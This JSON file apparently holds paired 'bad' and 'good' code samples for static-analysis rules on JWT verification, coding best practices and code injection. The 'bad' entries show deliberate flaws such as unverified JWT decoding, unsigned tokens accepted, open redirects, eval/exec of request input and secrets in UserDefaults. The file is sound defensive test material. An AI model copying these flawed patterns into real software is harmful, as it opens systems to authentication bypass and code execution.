[
  {
    "ruleId": "",
    "ruleTitle": "Secure JWT Authentication",
    "type": "bad",
    "code": "const jwt = require('jsonwebtoken');\n\nfunction notOk(token) {\n  // ruleid: jwt-decode-without-verify\n  if (jwt.decode(token, true).param === true) {\n    console.log('token is valid');\n  }\n}",
    "language": "javascript",
    "description": "JavaScript jsonwebtoken - decode without verify"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure JWT Authentication",
    "type": "good",
    "code": "const jwt = require('jsonwebtoken');\n\nfunction ok(token, key) {\n  // ok: jwt-decode-without-verify\n  jwt.verify(token, key);\n  if (jwt.decode(token, true).param === true) {\n    console.log('token is valid');\n  }\n}",
    "language": "javascript",
    "description": "JavaScript jsonwebtoken - verify before decode"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure JWT Authentication",
    "type": "bad",
    "code": "const jwt = require('jwt-simple');\nconst secretKey = process.env.JWT_SECRET;\n\n// Route that requires authentication\napp.get('/protectedRoute1', (req, res) => {\n  const token = req.headers.authorization;\n\n  if (!token) {\n    return res.status(401).json({ error: 'Unauthorized. Token missing.' });\n  }\n\n  try {\n    // ruleid: jwt-simple-noverify\n    const decoded = jwt.decode(token, secretKey, 'HS256');\n    res.json({ message: `Hello ${decoded.username}` });\n  } catch (error) {\n    res.status(401).json({ error: 'Unauthorized. Invalid token.' });\n  }\n});\n\n// Also incorrect - passing true disables verification\napp.get('/protectedRoute2', (req, res) => {\n  const token = req.headers.authorization;\n\n  try {\n    // ruleid: jwt-simple-noverify\n    const decoded = jwt.decode(token, secretKey, true);\n    res.json({ message: `Hello ${decoded.username}` });\n  } catch (error) {\n    res.status(401).json({ error: 'Unauthorized. Invalid token.' });\n  }\n});\n\n// Also incorrect - string 'false' is truthy\napp.get('/protectedRoute3', (req, res) => {\n  const token = req.headers.authorization;\n\n  try {\n    // ruleid: jwt-simple-noverify\n    const decoded = jwt.decode(token, secretKey, 'false');\n    res.json({ message: `Hello ${decoded.username}` });\n  } catch (error) {\n    res.status(401).json({ error: 'Unauthorized. Invalid token.' });\n  }\n});",
    "language": "javascript",
    "description": "JavaScript jwt-simple - verification disabled"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure JWT Authentication",
    "type": "good",
    "code": "const jwt = require('jwt-simple');\nconst secretKey = process.env.JWT_SECRET;\n\n// Route that requires authentication - default verification\napp.get('/protectedRoute4', (req, res) => {\n  const token = req.headers.authorization;\n\n  if (!token) {\n    return res.status(401).json({ error: 'Unauthorized. Token missing.' });\n  }\n\n  try {\n    // ok: jwt-simple-noverify\n    const decoded = jwt.decode(token, secretKey);\n    res.json({ message: `Hello ${decoded.username}` });\n  } catch (error) {\n    res.status(401).json({ error: 'Unauthorized. Invalid token.' });\n  }\n});\n\n// Explicitly enable verification with false\napp.get('/protectedRoute5', (req, res) => {\n  const token = req.headers.authorization;\n\n  try {\n    // ok: jwt-simple-noverify\n    const decoded = jwt.decode(token, secretKey, false);\n    res.json({ message: `Hello ${decoded.username}` });\n  } catch (error) {\n    res.status(401).json({ error: 'Unauthorized. Invalid token.' });\n  }\n});",
    "language": "javascript",
    "description": "JavaScript jwt-simple - verification enabled"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure JWT Authentication",
    "type": "bad",
    "code": "import jwt\nfrom jwt.exceptions import DecodeError, MissingRequiredClaimError, InvalidKeyError\n\ndef tests(token):\n    # ruleid:unverified-jwt-decode\n    jwt.decode(encoded, key, options={\"verify_signature\": False})\n\n    # ruleid:unverified-jwt-decode\n    opts = {\"verify_signature\": False}\n    jwt.decode(encoded, key, options=opts)\n\n    a_false_boolean = False\n    # ruleid:unverified-jwt-decode\n    opts2 = {\"verify_signature\": a_false_boolean}\n    jwt.decode(encoded, key, options=opts2)",
    "language": "python",
    "description": "Python PyJWT - verify_signature disabled"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure JWT Authentication",
    "type": "good",
    "code": "import jwt\nfrom jwt.exceptions import DecodeError, MissingRequiredClaimError, InvalidKeyError\n\ndef tests(token):\n    # ok:unverified-jwt-decode\n    jwt.decode(encoded, key, options={\"verify_signature\": True})\n\n    opts = {\"verify_signature\": True}\n    # ok:unverified-jwt-decode\n    jwt.decode(encoded, key, options=opts)\n\n    a_false_boolean = True\n    opts2 = {\"verify_signature\": a_false_boolean}\n    # ok:unverified-jwt-decode\n    jwt.decode(encoded, key, options=opts2)\n\n    # ok:unverified-jwt-decode - default is to verify\n    jwt.decode(encoded, key)",
    "language": "python",
    "description": "Python PyJWT - verify_signature enabled"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure JWT Authentication",
    "type": "bad",
    "code": "package jwt_test.jwt_test_1;\n\nimport com.auth0.jwt.JWT;\nimport com.auth0.jwt.algorithms.Algorithm;\nimport com.auth0.jwt.exceptions.JWTCreationException;\nimport com.auth0.jwt.interfaces.DecodedJWT;\nimport com.auth0.jwt.interfaces.JWTVerifier;\n\nabstract class App2\n{\n\n    private void bad( String[] args )\n    {\n        System.out.println( \"Hello World!\" );\n\n        try {\n            Algorithm algorithm = Algorithm.none();\n\n            String token = JWT.create()\n                .withIssuer(\"auth0\")\n                .sign(algorithm);\n            // ruleid: java-jwt-decode-without-verify\n            DecodedJWT jwt = JWT.decode(token);\n\n        } catch (JWTCreationException exception){\n            //Invalid Signing configuration / Couldn't convert Claims.\n        }\n\n    }\n}",
    "language": "java",
    "description": "Java auth0 java-jwt - decode without verify"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure JWT Authentication",
    "type": "good",
    "code": "package jwt_test.jwt_test_1;\n\nimport com.auth0.jwt.JWT;\nimport com.auth0.jwt.algorithms.Algorithm;\nimport com.auth0.jwt.exceptions.JWTCreationException;\nimport com.auth0.jwt.interfaces.DecodedJWT;\nimport com.auth0.jwt.interfaces.JWTVerifier;\n\npublic class App\n{\n\n    private void verifyToken(String token, String secret) {\n        Algorithm algorithm = Algorithm.HMAC256(secret);\n        JWTVerifier verifier = JWT.require(algorithm)\n                .withIssuer(\"auth0\")\n                .build(); //Reusable verifier instance\n        DecodedJWT jwt2 = verifier.verify(token);\n    }\n\n    public void ok( String[] args )\n    {\n        System.out.println( \"Hello World!\" );\n\n        try {\n            Algorithm algorithm = Algorithm.HMAC256(args[0]);\n\n            String token = JWT.create()\n                .withIssuer(\"auth0\")\n                .sign(algorithm);\n\n            // Decode only after verification in verifyToken()\n            DecodedJWT jwt = JWT.decode(token);\n\n        } catch (JWTCreationException exception){\n            //Invalid Signing configuration / Couldn't convert Claims.\n        }\n\n    }\n}",
    "language": "java",
    "description": "Java auth0 java-jwt - verify before use"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure JWT Authentication",
    "type": "bad",
    "code": "package main\n\nimport (\n    \"fmt\"\n\n    \"github.com/dgrijalva/jwt-go\"\n)\n\nfunc bad1(tokenString string) {\n    // ruleid: jwt-go-parse-unverified\n    token, _, err := new(jwt.Parser).ParseUnverified(tokenString, jwt.MapClaims{})\n    if err != nil {\n        fmt.Println(err)\n        return\n    }\n\n    if claims, ok := token.Claims.(jwt.MapClaims); ok {\n        fmt.Println(claims[\"foo\"], claims[\"exp\"])\n    } else {\n        fmt.Println(err)\n    }\n}",
    "language": "go",
    "description": "Go jwt-go - ParseUnverified"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure JWT Authentication",
    "type": "good",
    "code": "package main\n\nimport (\n    \"fmt\"\n\n    \"github.com/dgrijalva/jwt-go\"\n)\n\nfunc ok1(tokenString string, keyFunc Keyfunc) {\n    // ok: jwt-go-parse-unverified\n    token, err := new(jwt.Parser).ParseWithClaims(tokenString, jwt.MapClaims{}, keyFunc)\n    if err != nil {\n        fmt.Println(err)\n        return\n    }\n\n    if claims, ok := token.Claims.(jwt.MapClaims); ok {\n        fmt.Println(claims[\"foo\"], claims[\"exp\"])\n    } else {\n        fmt.Println(err)\n    }\n}",
    "language": "go",
    "description": "Go jwt-go - ParseWithClaims"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure JWT Authentication",
    "type": "bad",
    "code": "require 'jwt'\n\ndef bad1(hmac_secret)\n    # ruleid: ruby-jwt-decode-without-verify\n    decoded_token = JWT.decode token, hmac_secret, false, { algorithm: 'HS256' }\n    puts decoded_token\nend",
    "language": "ruby",
    "description": "Ruby ruby-jwt - verification disabled"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure JWT Authentication",
    "type": "good",
    "code": "require 'jwt'\n\ndef ok1(hmac_secret)\n    # ok: ruby-jwt-decode-without-verify\n    token = JWT.encode payload, hmac_secret, 'HS256'\n    puts token\n    decoded_token = JWT.decode token, hmac_secret, true, { algorithm: 'HS256' }\n    puts decoded_token\nend",
    "language": "ruby",
    "description": "Ruby ruby-jwt - verification enabled"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure JWT Authentication",
    "type": "bad",
    "code": "services.AddAuthentication(JwtBearerDefaults.AuthenticationScheme).AddJwtBearer(options =>\n            {\n\n                options.TokenValidationParameters = new TokenValidationParameters\n                {\n                    // ruleid: unsigned-security-token\n                    RequireSignedTokens = false,\n                    ValidateIssuer = false,\n                    ValidateAudience = false\n                };\n            });",
    "language": "csharp",
    "description": "C# TokenValidationParameters - unsigned tokens accepted"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure JWT Authentication",
    "type": "good",
    "code": "services.AddAuthentication(JwtBearerDefaults.AuthenticationScheme).AddJwtBearer(options =>\n            {\n                options.TokenValidationParameters = new TokenValidationParameters\n                {\n                    // ok: unsigned-security-token\n                    RequireSignedTokens = true,\n                    ValidateIssuer = false,\n                    ValidateAudience = false\n                };\n            });",
    "language": "csharp",
    "description": "C# TokenValidationParameters - signed tokens required"
  },
  {
    "ruleId": "",
    "ruleTitle": "Code Best Practices",
    "type": "bad",
    "code": "def func1():\n    # ruleid:open-never-closed\n    fd = open('foo')\n    x = 123",
    "language": "python",
    "description": "Python - file not closed"
  },
  {
    "ruleId": "",
    "ruleTitle": "Code Best Practices",
    "type": "good",
    "code": "def func2():\n    # ok:open-never-closed\n    fd = open('bar')\n    fd.close()\n\ndef func3():\n    # ok:open-never-closed\n    fd = open('baz')\n    try:\n        pass\n    finally:\n        fd.close()",
    "language": "python",
    "description": "Python - file properly closed"
  },
  {
    "ruleId": "",
    "ruleTitle": "Code Best Practices",
    "type": "bad",
    "code": "def func1():\n    # ruleid:unspecified-open-encoding\n    fd = open('foo')\n    fd.close()\n\ndef func2():\n    # ruleid:unspecified-open-encoding\n    fd = open('foo', mode=\"w\")\n    fd.close()",
    "language": "python",
    "description": "Python - unspecified encoding"
  },
  {
    "ruleId": "",
    "ruleTitle": "Code Best Practices",
    "type": "good",
    "code": "def func7():\n    # ok:unspecified-open-encoding\n    fd = open('foo', encoding='utf-8')\n    fd.close()\n\ndef func8():\n    # ok:unspecified-open-encoding\n    fd = open('foo', encoding=\"utf-8\", mode=\"w\")\n    fd.close()",
    "language": "python",
    "description": "Python - encoding specified"
  },
  {
    "ruleId": "",
    "ruleTitle": "Code Best Practices",
    "type": "bad",
    "code": "# ruleid:missing-hash-with-eq\nclass A:\n    def __eq__(self, someother):\n        pass",
    "language": "python",
    "description": "Python - missing __hash__ with __eq__"
  },
  {
    "ruleId": "",
    "ruleTitle": "Code Best Practices",
    "type": "good",
    "code": "# ok:missing-hash-with-eq\nclass A2:\n    def __eq__(self, someother):\n        pass\n\n    def __hash__(self):\n        pass",
    "language": "python",
    "description": "Python - __hash__ defined with __eq__"
  },
  {
    "ruleId": "",
    "ruleTitle": "Code Best Practices",
    "type": "bad",
    "code": "# ruleid:pass-body-range\nfor i in range(100):\n    pass\n\n# ruleid:pass-body-fn\ndef foo():\n    pass",
    "language": "python",
    "description": "Python - empty pass body"
  },
  {
    "ruleId": "",
    "ruleTitle": "Code Best Practices",
    "type": "good",
    "code": "def __init__(self):\n    # ok:pass-body-fn\n    pass\n\nclass foo:\n    def somemethod():\n        # ok:pass-body-fn\n        pass",
    "language": "python",
    "description": "Python - appropriate use of pass"
  },
  {
    "ruleId": "",
    "ruleTitle": "Code Best Practices",
    "type": "bad",
    "code": "import requests\n\nurl = \"www.github.com\"\n\n# ruleid: use-timeout\nr = requests.get(url)\n\n# ruleid: use-timeout\nr = requests.post(url)",
    "language": "python",
    "description": "Python - requests without timeout"
  },
  {
    "ruleId": "",
    "ruleTitle": "Code Best Practices",
    "type": "good",
    "code": "# ok: use-timeout\nr = requests.get(url, timeout=50)\n\ndef from_import_test1(url):\n    from requests import get, post\n\n    # ok: use-timeout\n    r = get(url, timeout=3)",
    "language": "python",
    "description": "Python - requests with timeout"
  },
  {
    "ruleId": "",
    "ruleTitle": "Code Best Practices",
    "type": "bad",
    "code": "from django.http import HttpResponse\nimport json\n\ndef foo():\n    # ruleid:use-json-response\n    dump = json.dumps({})\n    return HttpResponse(dump, content_type='application/json')",
    "language": "python",
    "description": "Django - HttpResponse with json.dumps"
  },
  {
    "ruleId": "",
    "ruleTitle": "Code Best Practices",
    "type": "bad",
    "code": "import flask\nimport json\napp = flask.Flask(__name__)\n\n@app.route(\"/user\")\ndef user():\n    user_dict = get_user(request.args.get(\"id\"))\n    # ruleid:use-jsonify\n    return json.dumps(user_dict)",
    "language": "python",
    "description": "Flask - json.dumps instead of jsonify"
  },
  {
    "ruleId": "",
    "ruleTitle": "Code Best Practices",
    "type": "bad",
    "code": "function smth() {\n  // ruleid: lazy-load-module\n  const mod = require('module-name')\n  return mod();\n}",
    "language": "javascript",
    "description": "JavaScript - lazy loading modules inside functions"
  },
  {
    "ruleId": "",
    "ruleTitle": "Code Best Practices",
    "type": "good",
    "code": "// ok: lazy-load-module\nconst fs = require('fs')",
    "language": "javascript",
    "description": "JavaScript - modules loaded at top level"
  },
  {
    "ruleId": "",
    "ruleTitle": "Code Best Practices",
    "type": "bad",
    "code": "// ruleid:javascript-prompt\nvar name = prompt('what is your name');\n// ruleid: javascript-alert\nalert('your name is ' + name);\n// ruleid: javascript-confirm\nif ( confirm(\"pushem!\") == true) {\n    r = \"x\";\n} else {\n    r = \"Y\";\n    // ruleid: javascript-debugger\n    debugger;\n}",
    "language": "javascript",
    "description": "JavaScript - debug statements in code"
  },
  {
    "ruleId": "",
    "ruleTitle": "Code Best Practices",
    "type": "bad",
    "code": "const zlib = require('zlib');\n\nconst payload = Buffer.from('This is some data');\n\nfor (let i = 0; i < 30000; ++i) {\n    // ruleid: zlib-async-loop\n    zlib.deflate(payload, (err, buffer) => {});\n}\n\n[1,2,3].forEach((el) => {\n    // ruleid: zlib-async-loop\n    zlib.deflate(payload, (err, buffer) => {});\n})",
    "language": "javascript",
    "description": "JavaScript - async zlib operations in loops"
  },
  {
    "ruleId": "",
    "ruleTitle": "Code Best Practices",
    "type": "good",
    "code": "for (let i = 0; i < 30000; ++i) {\n    // ok: zlib-async-loop\n    zlib.deflateSync(payload);\n}\n\n// ok: zlib-async-loop\nzlib.deflate(payload, (err, buffer) => {});",
    "language": "javascript",
    "description": "JavaScript - sync zlib or single async call"
  },
  {
    "ruleId": "",
    "ruleTitle": "Code Best Practices",
    "type": "bad",
    "code": "// ruleid: moment-deprecated\nimport moment from 'moment';\n// ruleid: moment-deprecated\nimport { moment } from 'moment';",
    "language": "typescript",
    "description": "TypeScript - using deprecated Moment.js"
  },
  {
    "ruleId": "",
    "ruleTitle": "Code Best Practices",
    "type": "good",
    "code": "// ok: moment-deprecated\nimport dayjs from 'dayjs';",
    "language": "typescript",
    "description": "TypeScript - using dayjs"
  },
  {
    "ruleId": "",
    "ruleTitle": "Code Best Practices",
    "type": "bad",
    "code": "function Test1(props) {\n// ruleid: react-props-spreading\n    const el = <App {...props} />;\n    return el;\n}\n\nfunction Test2(props) {\n// ruleid: react-props-spreading\n    const el = <MyCustomComponent {...props} some_other_prop={some_other_prop} />;\n    return el;\n}",
    "language": "jsx",
    "description": "React - spreading props directly"
  },
  {
    "ruleId": "",
    "ruleTitle": "Code Best Practices",
    "type": "good",
    "code": "function Test2(props, otherProps) {\n    const {src, alt} = props;\n    const {one_prop, two_prop} = otherProps;\n// ok: react-props-spreading\n    return <MyCustomComponent one_prop={one_prop} two_prop={two_prop} />;\n}",
    "language": "jsx",
    "description": "React - explicit props"
  },
  {
    "ruleId": "",
    "ruleTitle": "Code Best Practices",
    "type": "bad",
    "code": "class Test1 extends React.Component {\n  constructor() {\n    // ruleid:react-props-in-state\n    this.state = {\n          foo: 'bar',\n          color: this.props.color,\n          one: 1\n    };\n  }\n}\n\nfunction Test3({ text }) {\n  // ruleid:react-props-in-state\n  const [buttonText] = useState(text)\n  return <button>{buttonText}</button>\n}",
    "language": "jsx",
    "description": "React - copying props into state"
  },
  {
    "ruleId": "",
    "ruleTitle": "Code Best Practices",
    "type": "good",
    "code": "class OkTest extends React.Component {\n// ok: react-props-in-state\n  constructor() {\n    this.state = {\n          foo: 'bar',\n          initialColor: this.props.color,\n          one: 1\n    };\n  }\n}\n\nfunction OkTest1({ color, children }) {\n  const textColor = useMemo(\n// ok: react-props-in-state\n    () => slowlyCalculateTextColor(color),\n    [color]\n  );\n}",
    "language": "jsx",
    "description": "React - using props directly"
  },
  {
    "ruleId": "",
    "ruleTitle": "Code Best Practices",
    "type": "bad",
    "code": "# ruleid:iteration-over-ls-output\nfor file in $(ls dir); do echo \"Found a file: $file\"; done\n\n# ruleid:iteration-over-ls-output\nfor file in $(ls dir)\ndo\n  echo \"Found a file: $file\"\ndone",
    "language": "bash",
    "description": "Bash - iterating over ls output"
  },
  {
    "ruleId": "",
    "ruleTitle": "Code Best Practices",
    "type": "good",
    "code": "# ok:iteration-over-ls-output\nfor file in dir/*; do\n  echo \"Found a file: $file\"\ndone",
    "language": "bash",
    "description": "Bash - using globs"
  },
  {
    "ruleId": "",
    "ruleTitle": "Code Best Practices",
    "type": "bad",
    "code": "# ruleid:useless-cat\ncat | a b\n\n# ruleid:useless-cat\ncat file | a b\n\n# ruleid:useless-cat\na b | cat > file\n\n# ruleid:useless-cat\na b | cat | c d",
    "language": "bash",
    "description": "Bash - useless cat"
  },
  {
    "ruleId": "",
    "ruleTitle": "Code Best Practices",
    "type": "good",
    "code": "# ok:useless-cat\na b\n\n# ok:useless-cat\ncat file1 file2 | a b\n\n# ok:useless-cat\ncat $files | a b",
    "language": "bash",
    "description": "Bash - efficient file operations"
  },
  {
    "ruleId": "",
    "ruleTitle": "Code Best Practices",
    "type": "bad",
    "code": "// ruleid: bad-hexa-conversion\npublic static String badHash(String password) throws NoSuchAlgorithmException, UnsupportedEncodingException {\n    MessageDigest md = MessageDigest.getInstance(\"SHA-1\");\n    byte[] resultBytes = md.digest(password.getBytes(\"UTF-8\"));\n\n    StringBuilder stringBuilder = new StringBuilder();\n    for (byte b : resultBytes) {\n        stringBuilder.append(Integer.toHexString(b & 0xFF));\n    }\n\n    return stringBuilder.toString();\n}",
    "language": "java",
    "description": "Java - bad hexadecimal conversion"
  },
  {
    "ruleId": "",
    "ruleTitle": "Code Best Practices",
    "type": "good",
    "code": "// ok: bad-hexa-conversion\npublic static String goodHash(String password) throws NoSuchAlgorithmException, UnsupportedEncodingException {\n    MessageDigest md = MessageDigest.getInstance(\"SHA-1\");\n    byte[] resultBytes = md.digest(password.getBytes(\"UTF-8\"));\n\n    StringBuilder stringBuilder = new StringBuilder();\n    for (byte b : resultBytes) {\n        stringBuilder.append(String.format(\"%02X\", b));\n    }\n\n    return stringBuilder.toString();\n}",
    "language": "java",
    "description": "Java - proper hexadecimal conversion"
  },
  {
    "ruleId": "",
    "ruleTitle": "Code Best Practices",
    "type": "bad",
    "code": "public class CookieController {\n    public fun setCookie(value: String, response: HttpServletResponse) {\n        val cookie: Cookie = Cookie(\"cookie\", value)\n        // ruleid: cookie-missing-httponly\n        response.addCookie(cookie)\n    }\n\n    public fun explicitDisable(value: String, response: HttpServletResponse) {\n        val cookie: Cookie = Cookie(\"cookie\", value)\n        cookie.setSecure(false)\n        // ruleid:cookie-missing-httponly\n        cookie.setHttpOnly(false)\n        response.addCookie(cookie)\n    }\n}",
    "language": "kotlin",
    "description": "Kotlin - cookie missing HttpOnly flag"
  },
  {
    "ruleId": "",
    "ruleTitle": "Code Best Practices",
    "type": "good",
    "code": "public fun setSecureHttponlyCookie(value: String, response: HttpServletResponse ) {\n    val cookie: Cookie = Cookie(\"cookie\", value)\n    cookie.setSecure(true)\n    cookie.setHttpOnly(true)\n    // ok: cookie-missing-httponly\n    response.addCookie(cookie)\n}",
    "language": "kotlin",
    "description": "Kotlin - cookie with HttpOnly flag"
  },
  {
    "ruleId": "",
    "ruleTitle": "Code Best Practices",
    "type": "bad",
    "code": "void badcode(char *password, size_t bufferSize) {\n  char token[256];\n  init(token, password);\n  // ruleid: insecure-use-memset\n  memset(password, ' ', strlen(password));\n  // ruleid: insecure-use-memset\n  memset(token, ' ', strlen(localBuffer));\n  free(password);\n}",
    "language": "c",
    "description": "C - using memset for sensitive data"
  },
  {
    "ruleId": "",
    "ruleTitle": "Code Best Practices",
    "type": "good",
    "code": "void okcode(char *password, size_t bufferSize) {\n  char token[256];\n  init(token, password);\n  // ok: insecure-use-memset\n  memset_s(password, bufferSize, ' ', strlen(password));\n  // ok: insecure-use-memset\n  memset_s(token, sizeof(token), ' ', strlen(localBuffer));\n  free(password);\n}",
    "language": "c",
    "description": "C - using memset_s for sensitive data"
  },
  {
    "ruleId": "",
    "ruleTitle": "Code Best Practices",
    "type": "bad",
    "code": "func main() {\n\t// ruleid:bad-tmp-file-creation\n\terr := ioutil.WriteFile(\"/tmp/demo2\", []byte(\"This is some data\"), 0644)\n\tif err != nil {\n\t\tfmt.Println(\"Error while writing!\")\n\t}\n}",
    "language": "go",
    "description": "Go - bad tmp file creation"
  },
  {
    "ruleId": "",
    "ruleTitle": "Code Best Practices",
    "type": "good",
    "code": "func main_good() {\n\t// ok:bad-tmp-file-creation\n\terr := ioutil.Tempfile(\"/tmp\", \"my_temp\")\n\tif err != nil {\n\t\tfmt.Println(\"Error while writing!\")\n\t}\n}",
    "language": "go",
    "description": "Go - using ioutil.Tempfile"
  },
  {
    "ruleId": "",
    "ruleTitle": "Code Best Practices",
    "type": "bad",
    "code": "use std::env;\n\n// ruleid: temp-dir\nlet dir = env::temp_dir();",
    "language": "rust",
    "description": "Rust - using temp_dir for security operations"
  },
  {
    "ruleId": "",
    "ruleTitle": "Code Best Practices",
    "type": "bad",
    "code": "# ruleid: deprecated_use_bitwise\nuse Bitwise",
    "language": "elixir",
    "description": "Elixir - deprecated use Bitwise"
  },
  {
    "ruleId": "",
    "ruleTitle": "Code Best Practices",
    "type": "good",
    "code": "import Bitwise",
    "language": "elixir",
    "description": "Elixir - import Bitwise"
  },
  {
    "ruleId": "",
    "ruleTitle": "Code Best Practices",
    "type": "bad",
    "code": "# ruleid: enum_map_join\nEnum.join(Enum.map([\"a\", \"b\", \"c\"], fn s -> String.upcase(s) end), \", \")\n\n# ruleid: enum_map_join\nEnum.map([\"a\", \"b\", \"c\"], fn s -> String.upcase(s) end)\n|> Enum.join(\", \")\n\n# ruleid: enum_map_join\n[\"a\", \"b\", \"c\"]\n|> Enum.map(fn s -> String.upcase(s) end)\n|> Enum.join(\", \")",
    "language": "elixir",
    "description": "Elixir - inefficient Enum.map then Enum.join"
  },
  {
    "ruleId": "",
    "ruleTitle": "Code Best Practices",
    "type": "bad",
    "code": "let test a =\n  (* ruleid:ocamllint-bool-true *)\n  let x = a = true in\n  (* ruleid:ocamllint-bool-true *)\n  let x = a == true in\n  (* ruleid:ocamllint-bool-false *)\n  let x = a = false in\n  (* ruleid:ocamllint-bool-false *)\n  let x = a == false in\n  ()",
    "language": "ocaml",
    "description": "OCaml - explicit boolean comparisons"
  },
  {
    "ruleId": "",
    "ruleTitle": "Code Best Practices",
    "type": "good",
    "code": "",
    "language": "ocaml",
    "description": "OCaml - implicit boolean evaluation"
  },
  {
    "ruleId": "",
    "ruleTitle": "Code Best Practices",
    "type": "bad",
    "code": "let test1 xs =\n  (* ruleid:list-find-outside-try *)\n  if List.find 1 xs\n  then 1\n  else 2",
    "language": "ocaml",
    "description": "OCaml - List.find outside try block"
  },
  {
    "ruleId": "",
    "ruleTitle": "Code Best Practices",
    "type": "good",
    "code": "let test2 xs =\n (* ok *)\n try\n   if List.find 1 xs\n   then 1\n   else 2\n with Not_found -> 3",
    "language": "ocaml",
    "description": "OCaml - List.find inside try block"
  },
  {
    "ruleId": "",
    "ruleTitle": "Code Best Practices",
    "type": "bad",
    "code": "class GroupsController < ApplicationController\n\n  def show\n    #ruleid: check-unscoped-find\n    @user = User.find(params[:id])\n  end\n\n  def get\n    #ruleid: check-unscoped-find\n    @some_record = SomeRecord.find_by_id!(params[:id])\n  end\nend",
    "language": "ruby",
    "description": "Ruby - unscoped find with user input"
  },
  {
    "ruleId": "",
    "ruleTitle": "Code Best Practices",
    "type": "good",
    "code": "def show_ok\n  #ok: check-unscoped-find\n  @user = User.find(session[:id])\nend\n\ndef show_ok2\n  #ok: check-unscoped-find\n  current_user = User.find(session[:id])\n  #ok: check-unscoped-find\n  current_user.accounts.find(param[:id])\nend",
    "language": "ruby",
    "description": "Ruby - scoped find operations"
  },
  {
    "ruleId": "",
    "ruleTitle": "Code Best Practices",
    "type": "bad",
    "code": "<?php\n\n// ruleid: phpinfo-use\necho phpinfo();",
    "language": "php",
    "description": "PHP - phpinfo in production"
  },
  {
    "ruleId": "",
    "ruleTitle": "Code Best Practices",
    "type": "bad",
    "code": "let passphrase = getPass()\n\n// ruleid: swift-user-defaults\nUserDefaults.standard.set(passphrase, forKey: \"passphrase\")\n// ruleid: swift-user-defaults\nUserDefaults.standard.set(passWord, forKey: \"userPassword\")\n\n// ruleid: swift-user-defaults\nUserDefaults.standard.set(\"12717-127163-a71367-127ahc\", forKey: \"apiKey\")\n\nlet apiKey = \"12717-127163-a71367-127ahc\"\n// ruleid: swift-user-defaults\nUserDefaults.standard.set(apiKey, forKey: \"GOOGLE_TOKEN\")",
    "language": "swift",
    "description": "Swift - sensitive data in UserDefaults"
  },
  {
    "ruleId": "",
    "ruleTitle": "Code Best Practices",
    "type": "good",
    "code": "let username = getUsername()\n\n// okid: swift-user-defaults\nUserDefaults.standard.set(username, forKey: \"userName\")",
    "language": "swift",
    "description": "Swift - non-sensitive data in UserDefaults"
  },
  {
    "ruleId": "",
    "ruleTitle": "Code Best Practices",
    "type": "bad",
    "code": "resource \"aws_s3_bucket\" \"a\" {\n  bucket = \"my-tf-test-bucket\"\n  # ruleid: s3-public-read-bucket\n  acl    = \"public-read\"\n\n  tags = {\n    Name        = \"My bucket\"\n    Environment = \"Dev\"\n  }\n}\n\nresource \"aws_s3_bucket\" \"b\" {\n  bucket = \"my-tf-test-bucket-b\"\n  # ruleid: s3-public-read-bucket\n  acl    = \"authenticated-read\"\n}",
    "language": "hcl",
    "description": "Terraform - S3 bucket with public read access"
  },
  {
    "ruleId": "",
    "ruleTitle": "Code Best Practices",
    "type": "good",
    "code": "resource \"aws_s3_bucket\" \"c\" {\n  bucket = \"s3-website-test.hashicorp.com\"\n  # ok: s3-public-read-bucket\n  acl    = \"public-read\"\n  policy = file(\"policy.json\")\n\n  website {\n    index_document = \"index.html\"\n    error_document = \"error.html\"\n  }\n}",
    "language": "hcl",
    "description": "Terraform - S3 bucket with policy"
  },
  {
    "ruleId": "",
    "ruleTitle": "Code Best Practices",
    "type": "bad",
    "code": "[HttpPost]\npublic ActionResult LogOn(LogOnModel model, string returnUrl)\n{\n    if (ModelState.IsValid)\n    {\n        if (MembershipService.ValidateUser(model.UserName, model.Password))\n        {\n            FormsService.SignIn(model.UserName, model.RememberMe);\n            if (!String.IsNullOrEmpty(returnUrl))\n            {\n                // ruleid: open-redirect\n                return Redirect(returnUrl);\n            }\n        }\n    }\n}",
    "language": "csharp",
    "description": "C# - open redirect vulnerability"
  },
  {
    "ruleId": "",
    "ruleTitle": "Code Best Practices",
    "type": "good",
    "code": "[HttpPost]\npublic ActionResult LogOn(LogOnModel model, string returnUrl)\n{\n    if (ModelState.IsValid)\n    {\n        if (MembershipService.ValidateUser(model.UserName, model.Password))\n        {\n            FormsService.SignIn(model.UserName, model.RememberMe);\n            if (IsLocalUrl(returnUrl))\n            {\n                // ok: open-redirect\n                return Redirect(returnUrl);\n            }\n            else\n            {\n                return RedirectToAction(\"Index\", \"Home\");\n            }\n        }\n    }\n}",
    "language": "csharp",
    "description": "C# - validated redirect URL"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Code Injection",
    "type": "bad",
    "code": "# Direct eval with user input - VULNERABLE\ndef unsafe(request):\n    code = request.POST.get('code')\n    print(\"something\")\n    eval(code)\n\ndef unsafe_inline(request):\n    eval(request.GET.get('code'))\n\ndef unsafe_dict(request):\n    eval(request.POST['code'])\n\n# Dynamic string formatting in eval - VULNERABLE\ndynamic = \"import requests; r = requests.get('{}')\"\neval(dynamic.format(\"https://example.com\"))\n\ndef eval_something(something):\n    eval(something)\n\nuser_input = get_userinput()\neval(f\"some_func({user_input})\")\n\n# exec with user input - VULNERABLE\ndef unsafe_exec(request):\n    code = request.POST.get('code')\n    exec(code)\n\nasync def run_exec_by_event_loop(request):\n    code = request.POST[\"code\"]\n    loop = asyncio.get_running_loop()\n    await loop.run_in_executor(None, exec, code)",
    "language": "python",
    "description": "Python - eval/exec with user input"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Code Injection",
    "type": "good",
